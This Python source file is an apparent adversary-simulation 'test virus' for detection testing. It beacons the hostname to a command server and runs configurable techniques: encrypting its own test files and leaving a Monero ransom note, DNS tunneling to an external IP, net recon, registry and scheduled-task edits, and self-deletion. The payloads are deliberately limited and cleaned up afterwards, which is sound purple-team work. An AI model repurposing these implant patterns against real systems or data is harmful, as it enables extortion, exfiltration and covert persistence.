import time
import requests
import logging
import socket # Only gets used to get hostname 
import os
import sys
import subprocess
# import schedule
import time
import winreg
import shutil
import base64
from math import floor
from datetime import datetime, timedelta
from cryptography.fernet import Fernet
import glob 
# testing to see if cx_freeze can import scapy automatically like this
from scapy.layers.inet import IP, UDP
from scapy.layers.dns import DNS, DNSQR
from scapy.sendrecv import sr1


#Configurable Variables
API_KEY = "PLACEHOLDER_API_KEY"  
USE_CASES = PLACEHOLDER_USE_CASES

heartbeatRate = PLACEHOLDER_HEARTBEAT_RATE  # in seconds

# Ransomeware simulation variables 
# Generate a random key for encryption
encryption_key = Fernet.generate_key()
cipher_suite = Fernet(encryption_key)

# Directory and file configuration, testing with hardcoded path, 
# if run with flipper zero badusb script it saves to the user path instead of the test folder
# test_directory = "ransomware_test"
test_directory = "C:\\TestVirusPath\\ransomware_test"
file_count = 200
file_prefix = "test_file_"
file_extension = ".txt"



# Ransomeware simulation variables 
# Generate a random key for encryption
encryption_key = Fernet.generate_key()
cipher_suite = Fernet(encryption_key)

# Directory and file configuration, testing with hardcoded path, 
# if run with flipper zero badusb script it saves to the user path instead of the test folder
# test_directory = "ransomware_test"
test_directory = "C:\\TestVirusPath\\ransomware_test"
file_count = 200
file_prefix = "test_file_"
file_extension = ".txt"




##########################
#### Helper Functions ####
##########################

# Helper function to allow both external and localhost calls
def get_base_url():
    external_url = "https://www.bitlus.online"
    local_url = "http://127.0.0.1:5000"
    try:
        # Try reaching the external domain
        response = requests.get(external_url, timeout=2) 
        if response.status_code == 200:
            print(f"### External domain '{external_url}' is reachable.")
            return external_url
    except requests.RequestException:
        print(f"### External domain '{external_url}' is not reachable. Falling back to localhost.")
    # Fallback to localhost
    print(local_url)
    return local_url
base_url = get_base_url()

def data_to_send(data):
    try:
        # Validate and print the data structure
        print("API_KEY:", API_KEY)
        print("Data being sent from virus:", data)
        # f"{base_url}/api/datatosend",
        response = requests.post(
            f"{base_url}/api/datatosend",
            json={"api_key": API_KEY, "data": data},
        )
        print(response.text)
        if response.status_code == 200:
            print("Data sent successfully.")
        else:
            print(f"Failed to send data: {response.status_code}")
    except Exception as e:
        print(f"Error in data sending: {e}")

def logging_func(log_data):
    try:

        log_file_path = os.path.join(os.path.dirname(os.path.abspath(sys.argv[0])), 'test_virus.log')
        # Configure logging settings
        logging.basicConfig(
            filename=log_file_path,
            level=logging.INFO,
            format='%(asctime)s - %(message)s',
            datefmt='%Y-%m-%d %H:%M:%S',
        )

        # Log the provided data
        if isinstance(log_data, dict):
            # Convert dictionary data
            log_message = f"{log_data}"
        else:
            log_message = log_data

        logging.info(log_message)
        print(f"Logged: {log_message}")  
    except Exception as e:
        print(f"Error during logging: {e}")


####################################
####### Clean Up Functions #########
####################################

def clean_up():
    try:
        if USE_CASES.get('ransomware_simulation'):
            print("Cleaning up ransomware simulation files")
            # Call cleanup function for ransomware simulation
            cleanup_and_decrypt_files()

        if USE_CASES.get('scheduled_tasks'):
            print("Deleting scheduled test task")
            clean_scheduled_task()

        if USE_CASES.get('registry_edits'):
            print("Deleting registry edit")
            cleanup_registry_edits()
          
        logging_func("Clean_up completed. Deleting self.")

        # Self-delete
        delete_self()

    except Exception as e:
        logging_func(f"Error during clean_up: {e}")


def delete_self():
    try:
        # Get the directory where the executable or script is running
        base_directory = os.path.dirname(os.path.abspath(sys.argv[0]))
        # Paths to the files and folders
        lib_folder = os.path.join(base_directory, "Lib")
        exe_file = os.path.join(base_directory, "test_virus.exe")
        license_file = os.path.join(base_directory, "frozen_application_license.txt")
        # Need to test ways to delete all versions
        dll_file = os.path.join(base_directory, "python312.dll")
        cleanup_batch = os.path.join(base_directory, "cleanup.bat")
        # Write a cleanup batch script
        with open(cleanup_batch, "w") as batch_file:
            batch_file.write(f"@echo off\n")
            batch_file.write(f"timeout /t 4 > nul \n")  # Wait for 4 seconds 
            if os.path.exists(lib_folder):
                batch_file.write(f'rmdir /s /q "{lib_folder}"\n')  # Delete folder
            if os.path.exists(license_file):
                batch_file.write(f'del /f /q "{license_file}"\n')  # Delete license file
            
            batch_file.write(f'del /f /q "{dll_file}"\n')  # Delete DLL file
            batch_file.write(f'del /f /q "*zip"\n')  # Delete the zip file if present
            # if os.path.exists(dll_file):
            #     batch_file.write(f'del /f /q "{dll_file}"\n')  # Delete DLL file
            batch_file.write(f'del /f /q "{exe_file}"\n')  # Delete the EXE
            batch_file.write(f'del /f /q "{cleanup_batch}"\n')  # Delete the batch script itself
        # Log the cleanup action
        print(f"Cleanup script written to: {cleanup_batch}")
        # Schedule the batch script to run and immediately exit the program
        try:
            os.system(f"start /b cmd /c \"{cleanup_batch}\"")
        except Exception as e:
            print(f"Error: {e}")
        # Send back confirmation to server that the virus have been deleted before it gets removed
        try:
            payload = {
                "data": "Test virus and files have succesfully been deleted",
                "host_name": socket.gethostname()
            }
            data_to_send(payload)
        except Exception as e:
            print(f"Error during final goodbye message from virus: {e}")

        # Exit the program gracefully
        logging_func("Self-deletion sequence initiated, goodbye ")
        print("Self-deletion sequence initiated. Exiting program.")
        os._exit(0)  # Immediately terminate the Python process
    except Exception as e:
        print(f"Error during self-deletion: {e}")


def cleanup_and_decrypt_files():
    try:
        print("Starting cleanup and decryption of files")
        logging_func("Starting ransomware simulation cleanup ")

        # Step 1: Decrypt test files
        for i in range(file_count):
            try:
                print(f"Decrypting file {i+1} of {file_count}...")
                file_name = f"{file_prefix}{i}{file_extension}"
                file_path = os.path.join(test_directory, file_name)
                # Check if file exists
                if not os.path.exists(file_path):
                    print(f"File not found for decryption: {file_path}")
                    continue
                # Read encrypted data
                with open(file_path, "rb") as file:
                    encrypted_data = file.read()
                # Debugging: Display first few bytes of encrypted data
                print(f"Encrypted data (first 20 bytes): {encrypted_data[:20]}")
                # Decrypt data
                decrypted_data = cipher_suite.decrypt(encrypted_data)
                # Debugging: Display first few bytes of decrypted data
                print(f"Decrypted data (first 20 bytes): {decrypted_data[:20]}")
                # Write decrypted data back to file
                with open(file_path, "wb") as file:
                    file.write(decrypted_data)
                print(f"Decrypted file: {file_path}")
            except Exception as decrypt_error:
                print(f"Error decrypting file {file_name}: {decrypt_error}")
                # Continue to attempt decryption of the remaining files
                continue
        print(f"Decrypted {file_count} test files.")
        # Pause for demonstration purposes
        print("Sleeping for 10 seconds to display decrypted files...")
        time.sleep(10)
        print("Resuming cleanup process.")
        # Step 2: Remove test files and directory
        for i in range(file_count):
            try:
                file_name = f"{file_prefix}{i}{file_extension}"
                file_path = os.path.join(test_directory, file_name)

                if os.path.exists(file_path):
                    os.remove(file_path)
                    print(f"Deleted file: {file_path}")
                else:
                    print(f"File not found for deletion: {file_path}")
            except Exception as file_removal_error:
                print(f"Error deleting file {file_name}: {file_removal_error}")
                # Continue with cleanup of other files
                continue
        # Remove ransom note
        ransom_note_path = os.path.join(test_directory, "README_RECOVER.txt")
        if os.path.exists(ransom_note_path):
            os.remove(ransom_note_path)
            print(f"Deleted ransom note: {ransom_note_path}")
        else:
            print("Ransom note not found for deletion.")
        # Remove directory
        if os.path.exists(test_directory):
            os.rmdir(test_directory)
            print(f"Cleaned up directory: {test_directory}")
        else:
            print("Test directory not found for cleanup.")
        logging_func("ransomware_simulation_cleanup completed")
        return {"use_case": "ransomware_simulation_cleanup", "status": "completed"}
    except Exception as e:
        print(f"General error during cleanup: {e}")
        logging_func("ransomware_simulation_cleanup error")
        return {"use_case": "ransomware_simulation_cleanup", "status": f"error: {e}"}


def clean_scheduled_task(task_name="TestVirusTask"):
    try:
        # Define the command to delete the scheduled task
        delete_command = ["schtasks", "/Delete", "/TN", task_name, "/F" ]
        # Run the command to delete the task
        delete_result = subprocess.run(delete_command, capture_output=True, text=True)
        # Check if the deletion command was successful
        if delete_result.returncode == 0:
            print(f"Scheduled task '{task_name}' deleted successfully.")
            logging_func("scheduled task delete completed")
            return {"use_case": "scheduled_tasks_cleanup", "status": "completed"}
        else:
            print(f"Failed to delete scheduled task. Error: {delete_result.stderr}")
            logging_func("scheduled task delete error")
            return {"use_case": "scheduled_tasks_cleanup", "status": f"error: {delete_result.stderr}"}
    except Exception as e:
        print(f"An error occurred while deleting the scheduled task: {e}")
        logging_func("scheduled task delete error")
        return {"use_case": "scheduled_tasks_cleanup", "status": f"error: {e}"}

def cleanup_registry_edits():
    print("Registry cleanup simulation starting")
    logging_func("Registry cleanup simulation starting")
    try:
        # Connect to the registry and navigate to the test key location
        location_access = winreg.ConnectRegistry(None, winreg.HKEY_CURRENT_USER)
        parent_key_path = r"SOFTWARE\Microsoft\Windows\CurrentVersion"
        test_key_path = r"SOFTWARE\Microsoft\Windows\CurrentVersion\TestKey"
        # Open the parent key for access
        parent_key = winreg.OpenKey(location_access, parent_key_path, 0, winreg.KEY_ALL_ACCESS)
        # Delete the test key and all its values if it exists
        try:
            # Open the test key to enumerate and delete values if necessary
            test_key = winreg.OpenKey(location_access, test_key_path, 0, winreg.KEY_ALL_ACCESS)       
            # Enumerate and delete all values in the test key
            i = 0
            while True:
                try:
                    value_name = winreg.EnumValue(test_key, i)[0]
                    winreg.DeleteValue(test_key, value_name)
                except OSError:
                    break
                except IndexError:
                    break
                i += 1
            # Close the test key after enumeration
            winreg.CloseKey(test_key)
            # Delete the test key itself
            winreg.DeleteKey(parent_key, "TestKey")
            print(f"Deleted registry key: {test_key_path}")
        except FileNotFoundError:
            print(f"No registry key found at: {test_key_path}, nothing to delete.")
        # Close the parent key
        winreg.CloseKey(parent_key)
    except Exception as e:
        print(f"Error during registry cleanup: {e}")
        logging_func(f"Error during registry cleanup: {e}")
        return {"use_case": "registry_edits_cleanup", "status": f"error: {e}"}

    print("Registry cleanup completed")
    logging_func("Registry cleanup simulation finished")
    return {"use_case": "registry_edits_cleanup", "status": "completed"}


####################################
####### Use Case Functions #########
####################################

def ransomware_simulation():
    try:
        logging_func("Ransomware simulation starting")
        # Step 1: Create a test directory
        if not os.path.exists(test_directory):
            os.makedirs(test_directory)
            print(f"Created directory: {test_directory}")
        else:
            print(f"Directory already exists: {test_directory}")
        # Step 2: Create test files
        for i in range(file_count):
            file_name = f"{file_prefix}{i}{file_extension}"
            file_path = os.path.join(test_directory, file_name)
            with open(file_path, "w") as file:
                file.write(f"This is a test file number {i}.\n")
        print(f"Created {file_count} test files.")
        # Step 3: Encrypt test files, and only the test files
        for i in range(file_count):
            file_name = f"{file_prefix}{i}{file_extension}"
            file_path = os.path.join(test_directory, file_name)        
            with open(file_path, "rb") as file:
                file_data = file.read()       
            encrypted_data = cipher_suite.encrypt(file_data)
            with open(file_path, "wb") as file:
                file.write(encrypted_data)
        print(f"Encrypted {file_count} test files.")
        # Step 4: Create a ransom note
        ransom_note_path = os.path.join(test_directory, "README_RECOVER.txt")
        with open(ransom_note_path, "w") as ransom_note:
            ransom_note.write(
                "Your files have been encrypted! Pay 1 Monero to recover your data.\n"
                "Contact: hackerman@fakeanonimoushackers.com\n"
            )
        print("Ransom note created.")
        logging_func("ransomware simulation completed")
        return {"use_case": "ransomware_simulation", "status": "completed"}
    except Exception as e:
        print(f"Error during ransomware simulation: {e}")
        logging_func("ransomware simulation error")
        return {"use_case": "ransomware_simulation", "status": f"error: {e}"}

# Only works when doing calls to external url
def dns_tunneling():
    logging_func("DNS tunneling simulation starting")
    try:
        text = "testSuperSecretCode"
        text_bytes = base64.urlsafe_b64encode(text.encode("ascii"))
        text_str = text_bytes.decode("ascii")   
        qname = f"{text_str}.dns.bitlus.online"
        dns_req = IP(dst='79.76.56.138')/UDP(dport=53)/DNS(rd=1, qd=DNSQR(qname=qname))
        answer = sr1(dns_req, verbose=1, timeout=5)
        if answer:
            answer.show()  # This prints the entire DNS response
            print(f"DNS Tunneling successful")
            logging_func("DNS Tunneling successful")
            return {"use_case": "dns_tunneling", "status": f"completed"}
        else:
            print("No response received.")
            print(f"DNS Tunneling failed")
            logging_func("DNS Tunneling failed")
            return {"use_case": "dns_tunneling", "status": "failed", "error": "No repsonse from DNS server"}
    except Exception as e:
        print(f"Error in DNS Tunneling: {e}")
        logging_func("DNS Tunneling Error")
        return {"use_case": "dns_tunneling", "status": f"error{e}"}
    

    # DNS_TUNNEL_API = f"{base_url}/api/dnstunneling"
    # try:
    #     print("Executing DNS Tunneling Use-Case")
    #     # Example data to send
    #     data_to_send = f"{socket.gethostname()}-test-data"     
    #     # Encode data to Base64 (URL-safe)
    #     encoded_data = base64.urlsafe_b64encode(data_to_send.encode('utf-8')).decode('utf-8')
    #     print(f"Encoded Data (Base64): {encoded_data}")
    #     # Simulate a DNS query by sending the encoded data as a subdomain
    #     headers = {
    #         "Host": f"{encoded_data}.bitlus.online",  # Format as subdomain
    #     }
    #     # Send the request to the API
    #     response = requests.get(DNS_TUNNEL_API, headers=headers)
    #     # Handle the API response
    #     if response.status_code == 200:
    #         response_data = response.json()
    #         print(f"DNS Tunneling successful: {response_data['decoded_data']}")
    #         logging_func("DNS Tunneling successful")
    #         return {"use_case": "dns_tunneling", "status": f"completed: {response_data['decoded_data']}"}
    #     else:
    #         print(f"DNS Tunneling failed: {response.json().get('message')}")
    #         logging_func("DNS Tunneling failed")
    #         return {"use_case": "dns_tunneling", "status": "failed", "error": response.json().get('message')}
    # except Exception as e:
    #     print(f"Error in DNS Tunneling: {e}")
    #     logging_func("DNS Tunneling Error")
    #     return {"use_case": "dns_tunneling", "status": f"error{e}"}
 
def net_recon():
    CMD = ['group', 'user', 'localgroup', 'user /domain']
    print("NET.exe recon imitation starting")
    logging_func("NET.exe recon simulation starting")
    
    for i in CMD:
        command = f"net {i}"
        print(f"Running: {command}")
        try:
            # Execute the net command in a subprocess
            subprocess.run(command, shell=True, check=True)
        except subprocess.CalledProcessError as e:
            print(f"Unexpected error: {e}")
            #return {"use_case": "net_recon", "status": f"error: {e}"}
        except Exception as e:
            print(f"Unexpected error: {e}")
            #return {"use_case": "net_recon", "status": f"error: {e}"}

    logging_func("NET.exe recon simulation finished")
    return {"use_case": "net_recon", "status": "completed"}

def dll_side_loading():
    logging_func("DLL side loading simulation.")
    return {"use_case": "dll_side_loading", "status": "completed"}

def registry_edits():
    print("Registry edit simulation starting")
    logging_func("Registry edits loading simulation starting")
    try:
        # Open a registry key for reading and simulate an edit, but without actually setting any value
        location_access = winreg.ConnectRegistry(None, winreg.HKEY_CURRENT_USER)
        access_key = winreg.OpenKey(location_access, r"SOFTWARE\Microsoft\Windows\CurrentVersion", 0, winreg.KEY_ALL_ACCESS)

        # Enumerates values to make it extra suspect for AVs
        print("Enumerating values:")
        for i in range(10):
            try:
                value = winreg.EnumKey(access_key, i)
                print(f"Value {i}: {value}")
            except OSError:
                break

        # Simulate editing (adding or modifying a key-value pair)
        new_key = winreg.CreateKey(location_access, r"SOFTWARE\Microsoft\Windows\CurrentVersion\TestKey")
        winreg.SetValueEx(new_key, "TestValue", 0, winreg.REG_SZ, "Test Data")
        winreg.CloseKey(new_key)

        print("Simulated registry edit completed")
    except Exception as e:
        print(f"Error during registry edits: {e}")
        return {"use_case": "registry_edits", "status": f"error: {e}"}
    finally:
        print("Exiting registry edit sequence")
    logging_func("Registry edits loading simulation finished")
    return {"use_case": "registry_edits", "status": "completed"}

def scheduled_tasks():
    logging_func("scheduled tasks simulation starting")
    print("Executing scheduled tasks imitation")
    task_name = "TestVirusTask"
    try:
        # Define the command to create the scheduled task
        create_command = [
            "schtasks",
            "/Create",
            "/SC", "ONCE",  # Will only run once
            "/TN", task_name,
            "/TR", "C:\\Windows\\System32\\notepad.exe",  # Program to run
            "/ST", datetime.now().strftime("%H:%M:%S"),  # Current time
            "/F"  # Force overwrite if its already there
        ]
        # Create the scheduled task
        create_result = subprocess.run(create_command, capture_output=True, text=True)
        # Check if the creation command was successful
        if create_result.returncode == 0:
            print(f"Scheduled task '{task_name}' created successfully.")
        else:
            print(f"Failed to create scheduled task. Error: {create_result.stderr}")
            return {"use_case": "scheduled_tasks", "status": f"error: {create_result.stderr}"}
        # Run the task immediately
        run_command = ["schtasks", "/Run", "/TN", task_name]
        run_result = subprocess.run(run_command, capture_output=True, text=True)
        # Check if the run command was successful
        if run_result.returncode == 0:
            print(f"Scheduled task '{task_name}' executed successfully.")
        else:
            print(f"Failed to execute scheduled task. Error: {run_result.stderr}")
            return {"use_case": "scheduled_tasks", "status": f"error: {run_result.stderr}"}
    except Exception as e:
        print(f"An error occurred: {e}")
        return {"use_case": "scheduled_tasks", "status": f"error: {e}"}
    return {"use_case": "scheduled_tasks", "status": "completed"}

def encrypted_traffic():
    logging_func("scheduled tasks simulation.")
    return {"use_case": "encrypted_traffic", "status": "completed"}

def traffic_non_standard_ports():
    logging_func("traffic_non_standard_ports simulation.")
    return {"use_case": "traffic_non_standard_ports", "status": "completed"}


###########################
#### Control Functions ####
###########################

# Execution Flow Functions
def use_case_checker():
    print("use_case_checker called")
    logs = []
    for use_case, enabled in USE_CASES.items():
        print(f"Usecase: {use_case} , is {enabled}")
        if enabled:
            func = globals().get(use_case)  # Dynamically call the use case function
            if func:
                result = func()
                logs.append(result)
                print("------------------------------------------")
            else:
                logging_func(f"Use case function {use_case} not found.")
    return logs


def heart_beat():
    print("heart_beat called")
    try:
        hostname = socket.gethostname()
        print(hostname)
        while True:
            response = requests.post(
                f"{base_url}/api/heartbeat",
                json={"host_name": hostname, "api_key":API_KEY},
            )
            # print(response.raw)
            
            if response.status_code == 200:
                #print(response.json().get("message"))
                if response.json().get("is_alive") == "False":
                    logging_func("Received stop signal. Initiating clean_up.")
                    clean_up()
                    break
            else:
                print(f"Heartbeat response: {response.status_code}")
            time.sleep(heartbeatRate)
    except Exception as e:
        logging_func(f"Error in heartbeat: {e}")

# Test of functions
#dns_tunneling()
#scheduled_tasks()
#registry_edits()
#net_recon()
# delete_self2()

# Testing of ransomeware simulation 10 sec to see the files before the cleanup runs
# ransomware_simulation()
# time.sleep(10)
# cleanup_and_decrypt_files()

# Testing creation and delete of schedule task
# scheduled_tasks()
# clean_scheduled_task()

# Registry edit and clean test
# registry_edits()
# cleanup_registry_edits()

# #Main Execution
if __name__ == "__main__":
    try:
        logging_func("Starting test virus execution.")
        
        # Step 1: Execute use cases and collect aggregated logs
        logs = use_case_checker()
        payload = {
            "data": logs,
            "host_name": socket.gethostname()
        }
        print(socket.gethostname())
        logging_func(f"log_info: {logs}, host_name: {socket.gethostname()}")

        # Step 2: Send aggregated logs to the API
        data_to_send(payload)

        # Step 3: Enter heartbeat monitoring
        heart_beat()

    except Exception as e:
        logging_func(f"Error in main execution: {e}")